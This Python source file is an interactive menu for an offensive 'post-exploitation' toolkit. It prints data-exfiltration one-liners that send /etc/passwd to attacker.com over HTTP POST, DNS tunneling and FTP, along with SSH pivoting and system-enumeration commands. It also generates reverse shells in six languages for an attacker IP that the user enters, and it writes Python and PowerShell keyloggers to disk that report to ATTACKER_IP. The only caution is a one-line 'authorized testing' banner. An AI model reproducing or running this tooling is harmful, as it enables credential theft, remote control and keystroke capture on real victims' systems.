#!/usr/bin/env python3
"""
Post-Exploitation Module
"""
import os
import sys
from termcolor import colored
from utils.logger import setup_logger

# Import helper - Simple and clean
try:
    from core.post_exploit_helper import PostExploitHelper
except ImportError:
    print(colored("[!] Could not import post_exploit_helper", 'red'))
    print(colored("[!] Make sure core/post_exploit_helper.py exists", 'yellow'))
    sys.exit(1)

logger = setup_logger('post_exploit')

class PostExploitation:
    """Post-Exploitation Module"""
    
    def __init__(self):
        self.helper = PostExploitHelper()
    
    def run(self):
        try:
            print(colored("\n╔═══════════════════════════════════════════════════════════╗", 'magenta'))
            print(colored("║          Post-Exploitation Module v2.0                   ║", 'magenta', attrs=['bold']))
            print(colored("╚═══════════════════════════════════════════════════════════╝", 'magenta'))
            
            print(colored("\n[!] WARNING:", 'red', attrs=['bold']))
            print(colored("    This module is for authorized post-compromise testing!", 'yellow'))
            
            self.show_menu()
            
        except KeyboardInterrupt:
            print(colored("\n[!] Module interrupted", 'red'))
    
    def show_menu(self):
        while True:
            print(colored("\n" + "="*60, 'cyan'))
            print(colored("  POST-EXPLOITATION MENU", 'white', attrs=['bold']))
            print(colored("[1] ", 'green') + colored("Privilege Escalation", 'white'))
            print(colored("[2] ", 'green') + colored("Persistence", 'white'))
            print(colored("[3] ", 'green') + colored("Network Pivoting", 'white'))
            print(colored("[4] ", 'green') + colored("Data Exfiltration", 'white'))
            print(colored("[5] ", 'green') + colored("Reverse Shell Generator", 'white'))
            print(colored("[6] ", 'green') + colored("Keylogger", 'white'))
            print(colored("[7] ", 'green') + colored("System Enumeration", 'white'))
            print(colored("[0] ", 'red') + colored("Exit", 'white'))
            print(colored("="*60, 'cyan'))
            
            choice = input(colored("\nPost-Exploit> ", 'magenta', attrs=['bold']))
            
            if choice == '1':
                self.privilege_escalation()
            elif choice == '2':
                self.persistence()
            elif choice == '3':
                self.pivoting()
            elif choice == '4':
                self.exfiltration()
            elif choice == '5':
                self.reverse_shell()
            elif choice == '6':
                self.keylogger()
            elif choice == '7':
                self.enumeration()
            elif choice == '0':
                break
            else:
                print(colored("[!] Invalid option", 'red'))
    
    def privilege_escalation(self):
        print(colored("\n[+] Privilege Escalation", 'cyan', attrs=['bold']))
        print(colored("\n  [1] Linux", 'white'))
        print(colored("  [2] Windows", 'white'))
        
        choice = input(colored("\n[?] Select OS: ", 'cyan'))
        
        if choice == '1':
            checks = self.helper.generate_privesc_linux()
            print(colored("\n[+] Linux Privilege Escalation Checks:", 'green'))
            for name, check in checks.items():
                print(colored(f"\n  {name}:", 'yellow', attrs=['bold']))
                print(colored(f"    Command: {check['command']}", 'white'))
                print(colored(f"    Description: {check['description']}", 'cyan'))
        
        elif choice == '2':
            checks = self.helper.generate_privesc_windows()
            print(colored("\n[+] Windows Privilege Escalation Checks:", 'green'))
            for name, check in checks.items():
                print(colored(f"\n  {name}:", 'yellow', attrs=['bold']))
                print(colored(f"    Command: {check['command']}", 'white'))
                print(colored(f"    Description: {check['description']}", 'cyan'))
    
    def persistence(self):
        print(colored("\n[+] Persistence Mechanisms", 'cyan', attrs=['bold']))
        print(colored("\n  [1] Linux", 'white'))
        print(colored("  [2] Windows", 'white'))
        
        choice = input(colored("\n[?] Select OS: ", 'cyan'))
        
        if choice == '1':
            methods = self.helper.generate_persistence_linux()
            print(colored("\n[+] Linux Persistence Methods:", 'green'))
            for name, method in methods.items():
                print(colored(f"\n  {name}:", 'yellow', attrs=['bold']))
                print(colored(f"    Description: {method['description']}", 'cyan'))
                print(colored(f"    Command: {method['command']}", 'white'))
                print(colored(f"    Location: {method['location']}", 'white'))
        
        elif choice == '2':
            methods = self.helper.generate_persistence_windows()
            print(colored("\n[+] Windows Persistence Methods:", 'green'))
            for name, method in methods.items():
                print(colored(f"\n  {name}:", 'yellow', attrs=['bold']))
                print(colored(f"    Description: {method['description']}", 'cyan'))
                print(colored(f"    Command: {method['command']}", 'white'))
                print(colored(f"    Location: {method['location']}", 'white'))
    
    def pivoting(self):
        print(colored("\n[+] Network Pivoting", 'cyan', attrs=['bold']))
        print(colored("\n  SSH Tunneling:", 'yellow', attrs=['bold']))
        print(colored("    Local Port Forward:", 'cyan'))
        print(colored("      ssh -L 8080:internal-host:80 user@compromised", 'white'))
        print(colored("\n    Remote Port Forward:", 'cyan'))
        print(colored("      ssh -R 9090:localhost:3306 user@attacker", 'white'))
        print(colored("\n    Dynamic SOCKS Proxy:", 'cyan'))
        print(colored("      ssh -D 1080 user@compromised", 'white'))
        print(colored("      (Then use: proxychains <command>)", 'white'))
    
    def exfiltration(self):
        print(colored("\n[+] Data Exfiltration Methods", 'cyan', attrs=['bold']))
        print(colored("\n  HTTP POST:", 'yellow', attrs=['bold']))
        print(colored("    curl -X POST -F 'file=@/etc/passwd' http://attacker.com/upload", 'white'))
        print(colored("\n  DNS Tunneling:", 'yellow', attrs=['bold']))
        print(colored("    DATA=$(cat /etc/passwd | base64)", 'white'))
        print(colored("    nslookup $DATA.attacker.com", 'white'))
        print(colored("\n  FTP Upload:", 'yellow', attrs=['bold']))
        print(colored("    curl -T /etc/passwd ftp://attacker.com --user user:pass", 'white'))
    
    def reverse_shell(self):
        print(colored("\n[+] Reverse Shell Generator", 'cyan', attrs=['bold']))
        
        ip = input(colored("\n[+] Attacker IP: ", 'cyan'))
        port = input(colored("[+] Attacker Port: ", 'cyan'))
        
        print(colored("\n  [1] Bash", 'white'))
        print(colored("  [2] Python", 'white'))
        print(colored("  [3] PowerShell", 'white'))
        print(colored("  [4] Perl", 'white'))
        print(colored("  [5] PHP", 'white'))
        print(colored("  [6] Ruby", 'white'))
        print(colored("  [7] All", 'white'))
        
        choice = input(colored("\n[?] Select shell type: ", 'cyan'))
        
        shell_types = {
            '1': 'bash',
            '2': 'python',
            '3': 'powershell',
            '4': 'perl',
            '5': 'php',
            '6': 'ruby'
        }
        
        if choice == '7':
            # Show all
            for name in ['bash', 'python', 'powershell', 'perl', 'php', 'ruby']:
                shell = self.helper.generate_reverse_shell(ip, port, name)
                print(colored(f"\n[+] {name.title()} Reverse Shell:", 'green', attrs=['bold']))
                print(colored(f"    {shell[:150]}...", 'white'))
        elif choice in shell_types:
            shell_type = shell_types[choice]
            shell = self.helper.generate_reverse_shell(ip, port, shell_type)
            print(colored(f"\n[+] {shell_type.title()} Reverse Shell:", 'green', attrs=['bold']))
            print(colored(f"    {shell}", 'white'))
            
            # Save option
            save = input(colored("\n[?] Save to file? (y/N): ", 'cyan')).lower()
            if save == 'y':
                filename = f"reverse_shell_{shell_type}.sh"
                with open(filename, 'w') as f:
                    f.write(shell)
                print(colored(f"[+] Saved: {filename}", 'green'))
    
    def keylogger(self):
        print(colored("\n[+] Keylogger Generator", 'cyan', attrs=['bold']))
        print(colored("\n  [1] Python Keylogger", 'white'))
        print(colored("  [2] PowerShell Keylogger", 'white'))
        
        choice = input(colored("\n[?] Select type: ", 'cyan'))
        
        if choice == '1':
            code = self.helper.generate_keylogger_python()
            filename = 'keylogger.py'
            with open(filename, 'w') as f:
                f.write(code)
            print(colored(f"\n[+] Python keylogger saved: {filename}", 'green'))
            print(colored("[*] Remember to change ATTACKER_IP in the file!", 'yellow'))
        
        elif choice == '2':
            code = self.helper.generate_keylogger_powershell()
            filename = 'keylogger.ps1'
            with open(filename, 'w') as f:
                f.write(code)
            print(colored(f"\n[+] PowerShell keylogger saved: {filename}", 'green'))
            print(colored("[*] Remember to change ATTACKER_IP in the file!", 'yellow'))
    
    def enumeration(self):
        print(colored("\n[+] System Enumeration", 'cyan', attrs=['bold']))
        print(colored("\n  Linux Commands:", 'yellow', attrs=['bold']))
        print(colored("    uname -a              # Kernel version", 'white'))
        print(colored("    cat /etc/passwd       # User accounts", 'white'))
        print(colored("    cat /etc/issue        # OS version", 'white'))
        print(colored("    ifconfig -a           # Network interfaces", 'white'))
        print(colored("    netstat -tulpn        # Network connections", 'white'))
        print(colored("    ps aux                # Running processes", 'white'))
        print(colored("    w                     # Logged in users", 'white'))
        print(colored("    last                  # Login history", 'white'))
        
        print(colored("\n  Windows Commands:", 'yellow', attrs=['bold']))
        print(colored("    systeminfo            # System information", 'white'))
        print(colored("    net user              # User accounts", 'white'))
        print(colored("    net localgroup administrators  # Admins", 'white'))
        print(colored("    ipconfig /all         # Network config", 'white'))
        print(colored("    netstat -ano          # Network connections", 'white'))
        print(colored("    tasklist /v           # Running processes", 'white'))
        print(colored("    wmic qfe              # Installed patches", 'white'))
